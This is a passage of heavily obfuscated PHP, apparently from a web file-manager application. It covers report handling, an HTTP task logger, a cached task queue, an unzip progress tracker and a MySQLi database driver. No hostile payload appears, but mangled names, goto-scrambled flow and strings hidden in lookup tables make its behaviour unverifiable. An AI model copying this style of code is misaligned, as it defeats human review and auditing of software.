? $a«‹Ö›éöÄ[$e©²ó¼„Ä] : !1; } goto eÄª¸Şã¾Ö; eÄª¸Şã¾Ö: unset($eª»Ô¥æØß); goto d†å¿¦ë„ñ; d†å¿¦ë„ñ: } private function _makeOrder($c·ùä¤—À¨ = '') { goto bÈ†‡¼öÏ; bÈ†‡¼öÏ: $fÕÒÆ¿»ä© =& $_SERVER[Æ¼ôºÙï]; $d¹é³‰™éí = array($fÕÒÆ¿»ä©[192], $fÕÒÆ¿»ä©[465], $fÕÒÆ¿»ä©[1807], $fÕÒÆ¿»ä©[1808]); $eé¸˜¬§âè = array($fÕÒÆ¿»ä©[419] => $fÕÒÆ¿»ä©[420], $fÕÒÆ¿»ä©[421] => $fÕÒÆ¿»ä©[422]); goto aÀ¿†°õÇ; fˆŸÎ†…Œ÷: $c·ùä¤—À¨ = $c·ùä¤—À¨ . "{$d³áÑ³È}\40{$E©‘ÂÉæõæ}"; return $this->order($c·ùä¤—À¨); goto E˜ãÑ¥Ø—Ä; aÀ¿†°õÇ: $d³áÑ³È = Input::get($fÕÒÆ¿»ä©[424], $fÕÒÆ¿»ä©[7], $fÕÒÆ¿»ä©[407], $d¹é³‰™éí); $E©‘ÂÉæõæ = Input::get($fÕÒÆ¿»ä©[425], $fÕÒÆ¿»ä©[7], $fÕÒÆ¿»ä©[1821], array($fÕÒÆ¿»ä©[1746], $fÕÒÆ¿»ä©[421])); $E©‘ÂÉæõæ = $eé¸˜¬§âè[$E©‘ÂÉæõæ]; goto fˆŸÎ†…Œ÷; E˜ãÑ¥Ø—Ä: } public function reportAdd($F¸‰ŸõØ„) { $bªìŸ¤ã˜ =& $_SERVER[Æ¼ôºÙï]; $bê«¸ô³Ò³ = array($bªìŸ¤ã˜[457] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[457]], $bªìŸ¤ã˜[1502] => USER_ID); if (Model($bªìŸ¤ã˜[1817])->where($bê«¸ô³Ò³)->find()) { return !1; } $BÌ¦ğùîÄ­ = array($bªìŸ¤ã˜[457] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[457]], $bªìŸ¤ã˜[1407] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[1407]], $bªìŸ¤ã˜[387] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[387]], $bªìŸ¤ã˜[436] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[436]], $bªìŸ¤ã˜[1502] => USER_ID, $bªìŸ¤ã˜[29] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[29]], $bªìŸ¤ã˜[422] => $F¸‰ŸõØ„[$bªìŸ¤ã˜[422]]); return Model($bªìŸ¤ã˜[1817])->add($BÌ¦ğùîÄ­); } public function reportList($c¦áòêÏ¤) { goto bğßÔÄ¹ÆŒ; C±Ğ¢³Ã·¾: if (empty($a„ë›ñ‹„[$E¼½½Û±©ñ[363]])) { return array(); } $this->_listDataApply($a„ë›ñ‹„[$E¼½½Û±©ñ[363]]); return $a„ë›ñ‹„; goto F´›»ƒ‡ç; bğßÔÄ¹ÆŒ: $E¼½½Û±©ñ =& $_SERVER[Æ¼ôºÙï]; $a’ĞÇ‰ƒš = array(); if ($c¦áòêÏ¤[$E¼½½Û±©ñ[721]]) { $eîÓ¬î’µ„ = $c¦áòêÏ¤[$E¼½½Û±©ñ[465]] ? $c¦áòêÏ¤[$E¼½½Û±©ñ[465]] : strtotime(date($E¼½½Û±©ñ[1819])); $a’ĞÇ‰ƒš[$E¼½½Û±©ñ[192]] = array($E¼½½Û±©ñ[329], array($c¦áòêÏ¤[$E¼½½Û±©ñ[721]], $eîÓ¬î’µ„)); } goto b·¦½‹óÜ; b¢ŞÓ£Ê¹¨: $aÌê…¾ïİ¦ = array($E¼½½Û±©ñ[419] => $E¼½½Û±©ñ[420], $E¼½½Û±©ñ[421] => $E¼½½Û±©ñ[422]); $FĞ­ºôø‚ = $E¼½½Û±©ñ[1826] . $aÌê…¾ïİ¦[$d ´Úè„™]; $a„ë›ñ‹„ = Model($E¼½½Û±©ñ[1817])->where($a’ĞÇ‰ƒš)->order($FĞ­ºôø‚)->selectPage(20); goto C±Ğ¢³Ã·¾; b·¦½‹óÜ: if (isset($c¦áòêÏ¤[$E¼½½Û±©ñ[29]]) && in_array($c¦áòêÏ¤[$E¼½½Û±©ñ[29]], array($E¼½½Û±©ñ[86], $E¼½½Û±©ñ[1822], $E¼½½Û±©ñ[1823], $E¼½½Û±©ñ[1824], $E¼½½Û±©ñ[1825]))) { $a’ĞÇ‰ƒš[$E¼½½Û±©ñ[29]] = $c¦áòêÏ¤[$E¼½½Û±©ñ[29]]; } if (isset($c¦áòêÏ¤[$E¼½½Û±©ñ[708]]) && in_array($c¦áòêÏ¤[$E¼½½Û±©ñ[708]], array($E¼½½Û±©ñ[486], $E¼½½Û±©ñ[86], $E¼½½Û±©ñ[1822], $E¼½½Û±©ñ[1823]))) { $a’ĞÇ‰ƒš[$E¼½½Û±©ñ[708]] = $c¦áòêÏ¤[$E¼½½Û±©ñ[708]]; } $d ´Úè„™ = Input::get($E¼½½Û±©ñ[425], $E¼½½Û±©ñ[7], $E¼½½Û±©ñ[1821], array($E¼½½Û±©ñ[1746], $E¼½½Û±©ñ[421])); goto b¢ŞÓ£Ê¹¨; F´›»ƒ‡ç: } public function reportStatus($Bö“«™Óô) { goto AÃ›æó¤¶£; Bß¸±ÌØ¼º: return $AÁ”Ë«Ûä¡; goto fš¬ßÂò; f‘ßÛØ‚ğ: $AÁ”Ë«Ûä¡ = Model($BºÖ†¦½îš[1817])->where($aª´Î÷£ÇÊ)->save($CŒƒÀŞ³—); if ($Bö“«™Óô[$BºÖ†¦½îš[708]] == $BºÖ†¦½îš[1822]) { if ($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[436]] != $BºÖ†¦½îš[486] && $this->shareFileMeta($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[436]])) { $this->shareFileMeta($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[436]], 0); } $this->remove($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[457]]); return !0; } if ($AÁ”Ë«Ûä¡ && $Bö“«™Óô[$BºÖ†¦½îš[708]] == $BºÖ†¦½îš[1823]) { $BÜ°¹èº¾ = $CŒƒÀŞ³—[$BºÖ†¦½îš[708]] == $BºÖ†¦½îš[1823] ? 1 : 0; $this->shareFileMeta($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[436]], $BÜ°¹èº¾); $this->removeByFile($AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[436]]); } goto Bß¸±ÌØ¼º; AÃ›æó¤¶£: $BºÖ†¦½îš =& $_SERVER[Æ¼ôºÙï]; $aª´Î÷£ÇÊ = array($BºÖ†¦½îš[385] => $Bö“«™Óô[$BºÖ†¦½îš[385]]); $AŒÛÎ‘ÉÜ¦ = Model($BºÖ†¦½îš[1817])->where($aª´Î÷£ÇÊ)->field($BºÖ†¦½îš[1827])->find(); goto FÅŠËÎ±ö; FÅŠËÎ±ö: if (!$AŒÛÎ‘ÉÜ¦) { return !1; } $CŒƒÀŞ³— = array($BºÖ†¦½îš[708] => $Bö“«™Óô[$BºÖ†¦½îš[708]]); if ($Bö“«™Óô[$BºÖ†¦½îš[708]] == $BºÖ†¦½îš[1823] && $AŒÛÎ‘ÉÜ¦[$BºÖ†¦½îš[708]] == $BºÖ†¦½îš[1823]) { $CŒƒÀŞ³—[$BºÖ†¦½îš[708]] = 0; } goto f‘ßÛØ‚ğ; fš¬ßÂò: } private function removeByFile($bÛœ¦ÊÓÇš) { goto C½½š˜Ïªé; C½½š˜Ïªé: $A±ğè²ŞŒ =& $_SERVER[Æ¼ôºÙï]; $BÀİÙøë§Æ = Model($A±ğè²ŞŒ[770])->where(array($A±ğè²ŞŒ[436] => $bÛœ¦ÊÓÇš))->field($A±ğè²ŞŒ[387])->select(); $fª£‡¢˜ª¿ = array_to_keyvalue($BÀİÙøë§Æ, $A±ğè²ŞŒ[33], $A±ğè²ŞŒ[387]); goto a÷ÕÔ½­³½; E—¿Ù™ìµ—: $FŠÏ»†ï = array_to_keyvalue($BÀİÙøë§Æ, $A±ğè²ŞŒ[33], $A±ğè²ŞŒ[457]); $this->remove($FŠÏ»†ï); goto eìîĞŠ·ƒÖ; a÷ÕÔ½­³½: $E™Ô¸Û…ñ¯ = array($A±ğè²ŞŒ[387] => array($A±ğè²ŞŒ[7], $fª£‡¢˜ª¿), $A±ğè²ŞŒ[462] => 1); $BÀİÙøë§Æ = Model($A±ğè²ŞŒ[1638])->where($E™Ô¸Û…ñ¯)->field($A±ğè²ŞŒ[457])->select(); if (empty($BÀİÙøë§Æ)) { return; } goto E—¿Ù™ìµ—; eìîĞŠ·ƒÖ: } private function shareFileMeta($AÕà‰ç¼ºÎ, $BğªÜôÁ¼˜ = null) { $B°Ú…Ã¿æ£ =& $_SERVER[Æ¼ôºÙï]; $BùäÍÙ‘ë… = array($B°Ú…Ã¿æ£[436] => $AÕà‰ç¼ºÎ, $B°Ú…Ã¿æ£[92] => $B°Ú…Ã¿æ£[1828]); if (is_null($BğªÜôÁ¼˜)) { return Model($B°Ú…Ã¿æ£[1829])->where($BùäÍÙ‘ë…)->find(); } $BùäÍÙ‘ë…[$B°Ú…Ã¿æ£[368]] = $BğªÜôÁ¼˜; Model($B°Ú…Ã¿æ£[1829])->add($BùäÍÙ‘ë…, array(), !0); } } goto FùêÈéÀÈÁ; f’Í²©‡ƒë: class TaskHttp extends Task { protected function startAfter() { $bé»ˆ‚Ï¡Ş =& $_SERVER[Æ¼ôºÙï]; $EåÊ˜¨Î¤Û =& $this->task; $EåÊ˜¨Î¤Û[$bé»ˆ‚Ï¡Ş[1567]] = 1; Hook::bind($bé»ˆ‚Ï¡Ş[1539], array($this, $bé»ˆ‚Ï¡Ş[1568])); Hook::bind($bé»ˆ‚Ï¡Ş[1541], array($this, $bé»ˆ‚Ï¡Ş[1569])); Hook::bind($bé»ˆ‚Ï¡Ş[1543], array($this, $bé»ˆ‚Ï¡Ş[1570])); } protected function endAfter() { $eÄà¤¥·®É =& $_SERVER[Æ¼ôºÙï]; Hook::unbind($eÄà¤¥·®É[1539], array($this, $eÄà¤¥·®É[1568])); Hook::unbind($eÄà¤¥·®É[1541], array($this, $eÄà¤¥·®É[1569])); Hook::unbind($eÄà¤¥·®É[1543], array($this, $eÄà¤¥·®É[1570])); } public function progressStart($e¼İäåš) { $fÛ¯‹ŸæÍ· =& $_SERVER[Æ¼ôºÙï]; $Cøî ¹µà = curl_getinfo($e¼İäåš); self::log($fÛ¯‹ŸæÍ·[1571] . $Cøî ¹µà[$fÛ¯‹ŸæÍ·[303]]); self::valueSet($this->task[$fÛ¯‹ŸæÍ·[385]], $this->task); } public function progressEnd($fèº·‚Øö›) { $DğßÛšç‹Ÿ =& $_SERVER[Æ¼ôºÙï]; self::log($DğßÛšç‹Ÿ[1572] . $this->task[$DğßÛšç‹Ÿ[385]]); $this->end(); } public function progress($eÌËœÀí‰•, $f‘ ¶ğáİ, $AîóŠ‘Ò¸Å, $c°ÀÒßéÉ†, $F‡©‘‹Ş¬) { $CÓ…Ó§öÇç =& $_SERVER[Æ¼ôºÙï]; $a·àƒ®éí¯ =& $this->task; if ($F‡©‘‹Ş¬ > 0) { $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]] = $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]] == 0 ? $c°ÀÒßéÉ† : $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]]; $a·àƒ®éí¯[$CÓ…Ó§öÇç[1014]] = $F‡©‘‹Ş¬; } else { if ($AîóŠ‘Ò¸Å > 0) { $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]] = $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]] == 0 ? $f‘ ¶ğáİ : $a·àƒ®éí¯[$CÓ…Ó§öÇç[1000]]; $a·àƒ®éí¯[$CÓ…Ó§öÇç[1014]] = $AîóŠ‘Ò¸Å; } } $this->update(); self::log("\160\162\157\147\x72\145\163\163\110\x74\164\160\x3a\144\157\x77\156\72{$AîóŠ‘Ò¸Å}\x2f{$f‘ ¶ğáİ}\x3b\x20\165\160\x6c\x6f\141\144\x3a{$F‡©‘‹Ş¬}\57{$c°ÀÒßéÉ†}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\x75\x65\165\x65\114\x65\156\x67\x74\150"; const QUEUE_DATA = "\164\x61\163\153\x51\165\145\x75\145\x44\141\x74\141"; public static function initTask() { } public static function add($dœÌ ãÒ‚ì, $Bë„ë–¶¿ = array(), $c¸ö¤‹²¬ = '', $eï¶ Œ—í = '') { goto FøÔÑ™ Ì•; døêÇš÷ƒÏ: if ($eï¶ Œ—í && array_find_by_field($Dƒêô–Ûå·, $aš“•‰İ³[92], $eï¶ Œ—í)) { return !0; } $Dƒêô–Ûå·[] = array($aš“•‰İ³[260] => $dœÌ ãÒ‚ì, $aš“•‰İ³[1573] => $Bë„ë–¶¿, $aš“•‰İ³[422] => $c¸ö¤‹²¬, $aš“•‰İ³[92] => $eï¶ Œ—í); write_log($aš“•‰İ³[1574] . $c¸ö¤‹²¬, $aš“•‰İ³[1575]); goto F®åÒÏƒ„Ï; FøÔÑ™ Ì•: $aš“•‰İ³ =& $_SERVER[Æ¼ôºÙï]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Dƒêô–Ûå· = self::getAll(); goto døêÇš÷ƒÏ; F®åÒÏƒ„Ï: self::setAll($Dƒêô–Ûå·); return !0; goto C‰˜“â³¥’; C‰˜“â³¥’: } public static function run() { goto cĞ³—ù™è£; fˆ»¼ºÒ§: if (!$D“™µÓâÜÏ) { return !1; } self::setAll($FÒŒ†Á•‘˜); write_log($DÉîÙ‡‰â[1576] . $D“™µÓâÜÏ[$DÉîÙ‡‰â[422]], $DÉîÙ‡‰â[1575]); goto D²àÓöïõ; D²àÓöïõ: try { $AÑ¡ˆîº£Õ = Hook::apply($D“™µÓâÜÏ[$DÉîÙ‡‰â[260]], $D“™µÓâÜÏ[$DÉîÙ‡‰â[1573]]); } catch (Exception $B®âŠš²) { } write_log($DÉîÙ‡‰â[1577] . $D“™µÓâÜÏ[$DÉîÙ‡‰â[422]], $DÉîÙ‡‰â[1575]); return !0; goto Díàò »æ; cĞ³—ù™è£: $DÉîÙ‡‰â =& $_SERVER[Æ¼ôºÙï]; $FÒŒ†Á•‘˜ = self::getAll(); $D“™µÓâÜÏ = array_shift($FÒŒ†Á•‘˜); goto fˆ»¼ºÒ§; Díàò »æ: } public static function count() { $E·œ×íŒ°Ò = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$E·œ×íŒ°Ò) { return 0; } return intval($E·œ×íŒ°Ò); } public static function getAll() { $CéÑˆŠºï = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$CéÑˆŠºï) { return array(); } return $CéÑˆŠºï; } public static function setAll($FÏññ™™Šö) { $fÏ™¾‡ÜÃ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($FÏññ™™Šö), $fÏ™¾‡ÜÃ); Cache::set(self::QUEUE_DATA, $FÏññ™™Šö, $fÏ™¾‡ÜÃ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c‰Û‚Òé”; BÉ†ÕË¿—Œ: if (!$b­ñ·Åßç[$a—ÀÒ‚°õ[1407]]) { $b­ñ·Åßç[$a—ÀÒ‚°õ[1407]] = LNG($a—ÀÒ‚°õ[1582]); } goto E‘‹ïŞ‘¾Œ; d™á¦‹Ô¶Ê: Hook::bind($a—ÀÒ‚°õ[1068], array($this, $a—ÀÒ‚°õ[1580])); $b­ñ·Åßç =& $this->task; $b­ñ·Åßç[$a—ÀÒ‚°õ[1581]] = $a—ÀÒ‚°õ[1073]; goto BÉ†ÕË¿—Œ; c‰Û‚Òé”: $a—ÀÒ‚°õ =& $_SERVER[Æ¼ôºÙï]; parent::startAfter(); Hook::bind($a—ÀÒ‚°õ[1578], array($this, $a—ÀÒ‚°õ[1579])); goto d™á¦‹Ô¶Ê; E‘‹ïŞ‘¾Œ: } protected function endAfter() { $a…¬öÂ·¾á =& $_SERVER[Æ¼ôºÙï]; parent::endAfter(); Hook::unbind($a…¬öÂ·¾á[1578], array($this, $a…¬öÂ·¾á[1579])); Hook::unbind($a…¬öÂ·¾á[1068], array($this, $a…¬öÂ·¾á[1580])); } public function updateAfter() { $d’ã–ÅƒÎâ =& $_SERVER[Æ¼ôºÙï]; $e˜ÛÙßŒö =& $this->task; if (!$e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1000]] || !$e˜ÛÙßŒö[$d’ã–ÅƒÎâ[717]]) { return; } if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1581]] == $d’ã–ÅƒÎâ[1073]) { $cøçá†õ‘À = 0; if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1547]]) { $cøçá†õ‘À = $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1548]] / $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1547]]; } $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]] = $cøçá†õ‘À * 0.3; } else { if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1581]] == $d’ã–ÅƒÎâ[309]) { $cøçá†õ‘À = $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1014]] / $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1000]]; $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]] = 0.3 + $cøçá†õ‘À * 0.4; } else { if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1581]] == $d’ã–ÅƒÎâ[106]) { $B¿‰¤à¦‰ƒ = 0; if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1549]] == $d’ã–ÅƒÎâ[106]) { $B¿‰¤à¦‰ƒ = $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1548]]; } $cøçá†õ‘À = ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1552]] + $B¿‰¤à¦‰ƒ) / $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[717]]; $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]] = 0.3 + 0.4 + $cøçá†õ‘À * 0.3; } } } if ($e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]] > 0) { $dåÔ¶‚„ñ¾ = timeFloat() - $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1505]] - $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1508]]; $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1509]] = $dåÔ¶‚„ñ¾ * (1 - $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]]) / $e˜ÛÙßŒö[$d’ã–ÅƒÎâ[1503]]; } } public function addFile($Aæ¼ãÖ‚Í¼) { goto f‰»–Ò«ó³; cøÃÚ§ÍÌ÷: $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1002]] = $BŠ–ù‰öùì[1564]; $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1549]] = $BŠ–ù‰öùì[1073]; $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[717]] = $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[77]]; goto e¥à¢ ßÉ„; D™÷¢–Çõ´: $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1545]] = $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[28]]; $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1547]] = $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[77]]; $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1548]] = 0; goto cøÃÚ§ÍÌ÷; E¯ëÚÜŒŸŒ: $this->update(); goto bæªÇ ã¨È; f‰»–Ò«ó³: $BŠ–ù‰öùì =& $_SERVER[Æ¼ôºÙï]; $fŒ¥ëƒéÙ© =& $this->task; $aØÖ»¨Ã¶” = IO::info($Aæ¼ãÖ‚Í¼); goto D™÷¢–Çõ´; e¥à¢ ßÉ„: $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1000]] = 1; $F¿Î†öÃİÖ = 0; $fŒ¥ëƒéÙ©[$BŠ–ù‰öùì[1556]] = array($BŠ–ù‰öùì[1557] => $F¿Î†öÃİÖ + 1, $BŠ–ù‰öùì[404] => $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[28]], $BŠ–ù‰öùì[75] => $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[75]], $BŠ–ù‰öùì[484] => $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[484]] ? $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[484]] : $aØÖ»¨Ã¶”[$BŠ–ù‰öùì[75]]); goto E¯ëÚÜŒŸŒ; bæªÇ ã¨È: } public function unzipAfter($aŸ˜Ìõ‚) { goto C¥Ä›íË†; C¥Ä›íË†: $aÃ…ˆ¬—‰Ñ =& $_SERVER[Æ¼ôºÙï]; $AÀÈ±ĞùÅ =& $this->task; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1581]] = $aÃ…ˆ¬—‰Ñ[106]; goto eñãçİé›†; e‚òŠÆˆ×: $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1545]] = $aÃ…ˆ¬—‰Ñ[33]; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1552]] = 0; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[717]] = $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[77]]; goto B°²ìä‡ğ; B°²ìä‡ğ: $this->update(); self::log($aÃ…ˆ¬—‰Ñ[1583] . json_encode(array($AÀÈ±ĞùÅ, $C©ÎÙÀêÁœ))); goto Eö¤…á±°; D¢±ÁÃ÷…œ: $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1014]] = 0; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1547]] = 0; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1548]] = 0; goto e‚òŠÆˆ×; Cì»©·õ™: if ($C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[29]] == $aÃ…ˆ¬—‰Ñ[173]) { $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1000]] = 1; } else { $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1000]] = $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[80]][$aÃ…ˆ¬—‰Ñ[78]]; } $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1002]] = $aÃ…ˆ¬—‰Ñ[33]; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1549]] = 0; goto D¢±ÁÃ÷…œ; eñãçİé›†: $C©ÎÙÀêÁœ = IO::infoWithChildren($aŸ˜Ìõ‚); $DèÈøƒÙÎ¸ = 0; $AÀÈ±ĞùÅ[$aÃ…ˆ¬—‰Ñ[1556]] = array($aÃ…ˆ¬—‰Ñ[1557] => $DèÈøƒÙÎ¸ + 1, $aÃ…ˆ¬—‰Ñ[404] => $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[28]], $aÃ…ˆ¬—‰Ñ[75] => $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[75]], $aÃ…ˆ¬—‰Ñ[484] => $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[484]] ? $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[484]] : $C©ÎÙÀêÁœ[$aÃ…ˆ¬—‰Ñ[75]]); goto Cì»©·õ™; Eö¤…á±°: } public function nameParse($e‰ÎôÇ¸¯) { goto a³Š—¢øÀõ; a³Š—¢øÀõ: $CÑŠƒæ«ø =& $_SERVER[Æ¼ôºÙï]; $B¹ÌŸá®™ =& $this->task; if ($B¹ÌŸá®™[$CÑŠƒæ«ø[1581]] == $CÑŠƒæ«ø[1073]) { $B¹ÌŸá®™[$CÑŠƒæ«ø[1581]] = $CÑŠƒæ«ø[309]; $B¹ÌŸá®™[$CÑŠƒæ«ø[1552]] = 0; $B¹ÌŸá®™[$CÑŠƒæ«ø[717]] = 0; } goto CÖÔ‹Ï—; CÖÔ‹Ï—: $aæëì‘Ï­– = get_path_this($e‰ÎôÇ¸¯); if (strstr($aæëì‘Ï­–, $CÑŠƒæ«ø[94])) { $B¹ÌŸá®™[$CÑŠƒæ«ø[1014]] += 1; $B¹ÌŸá®™[$CÑŠƒæ«ø[1000]] += 1; } $B¹ÌŸá®™[$CÑŠƒæ«ø[1545]] = $e‰ÎôÇ¸¯; goto C½¹†Æó‡³; C½¹†Æó‡³: $this->update(); goto DÀ§Ş»Òá£; DÀ§Ş»Òá£: } } goto cØ¢ÏŒÛô„; aôÅ¢‹à™: class DbMysqli extends Db { public function __construct($FèÓ±®§° = '') { $fÖ‡ñâç³ =& $_SERVER[Æ¼ôºÙï]; if (!extension_loaded($fÖ‡ñâç³[745])) { think_exception(think_lang($fÖ‡ñâç³[10]) . $fÖ‡ñâç³[851]); } if (!empty($FèÓ±®§°)) { $this->config = $FèÓ±®§°; if (empty($this->config[$fÖ‡ñâç³[13]])) { $this->config[$fÖ‡ñâç³[13]] = $fÖ‡ñâç³[33]; } } } public function connect($AÆ¯õë•„ = '', $Dóî’ª½Çñ = 0) { $A¶¾†ƒ£†ñ =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->linkID[$Dóî’ª½Çñ])) { goto f„¯¹¨äĞŠ; D¯‡°Àé¤¬: $this->connected = !0; if (1 != think_config($A¶¾†ƒ£†ñ[18])) { unset($this->config); } goto cë®«‘‘´š; f„¯¹¨äĞŠ: if (empty($AÆ¯õë•„)) { $AÆ¯õë•„ = $this->config; } $this->linkID[$Dóî’ª½Çñ] = new mysqli($AÆ¯õë•„[$A¶¾†ƒ£†ñ[825]], $AÆ¯õë•„[$A¶¾†ƒ£†ñ[827]], $AÆ¯õë•„[$A¶¾†ƒ£†ñ[828]], $AÆ¯õë•„[$A¶¾†ƒ£†ñ[17]], $AÆ¯õë•„[$A¶¾†ƒ£†ñ[826]] ? intval($AÆ¯õë•„[$A¶¾†ƒ£†ñ[826]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto e··³à’Ù«; e··³à’Ù«: $F´Íğ™ˆ³¢ = $this->linkID[$Dóî’ª½Çñ]->server_version; $this->linkID[$Dóî’ª½Çñ]->query($A¶¾†ƒ£†ñ[829] . think_config($A¶¾†ƒ£†ñ[830]) . $A¶¾†ƒ£†ñ[55]); if ($F´Íğ™ˆ³¢ > $A¶¾†ƒ£†ñ[831]) { $this->linkID[$Dóî’ª½Çñ]->query($A¶¾†ƒ£†ñ[832]); } goto D¯‡°Àé¤¬; cë®«‘‘´š: } return $this->linkID[$Dóî’ª½Çñ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aÇ¶Ü§¤ƒ”) { goto Díä‚¦“Ì; e­›ÚÌ²ïì: $this->queryStr = $aÇ¶Ü§¤ƒ”; if ($this->queryID) { $this->free(); } think_action_status($eë×†Ôª‹Ğ[19], 1); goto F§ôä¹…›; fÁÛÁÈÅ‚×: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto B±„òÈ; F§ôä¹…›: think_status($eë×†Ôª‹Ğ[20]); $this->queryID = $this->_linkID->query($aÇ¶Ü§¤ƒ”); if ($this->_linkID->more_results()) { while (($aæÂÀÕõ• = $this->_linkID->next_result()) != NULL) { $aæÂÀÕõ•->free_result(); } } goto fÁÛÁÈÅ‚×; Díä‚¦“Ì: $eë×†Ôª‹Ğ =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e­›ÚÌ²ïì; B±„òÈ: } public function execute($a‹´ĞØ°Å) { goto e×¿Ã›£â‰; bøÈÍíŸ¤ì: $this->queryStr = $a‹´ĞØ°Å; if ($this->queryID) { $this->free(); } think_action_status($f°÷¬›ê[21], 1); goto B¶‹Á¦ä ; B¶‹Á¦ä : think_status($f°÷¬›ê[20]); $cæ²åÉÌÙ = $this->_linkID->query($a‹´ĞØ°Å); $this->debug(); goto b—ƒˆ©ôâí; b—ƒˆ©ôâí: if (!1 === $cæ²åÉÌÙ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto fÁ¸Ãé²³; e×¿Ã›£â‰: $f°÷¬›ê =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bøÈÍíŸ¤ì; fÁ¸Ãé²³: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fõ ¦™‹ê† = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Fõ ¦™‹ê†) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B›‡¹é×á = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B›‡¹é×á) { $this->error(); return !1; } } return !0; } private function getAll() { $FÒµ¿Òîß‡ = array(); if ($this->numRows > 0) { for ($aæÈ¥ÕÒö = 0; 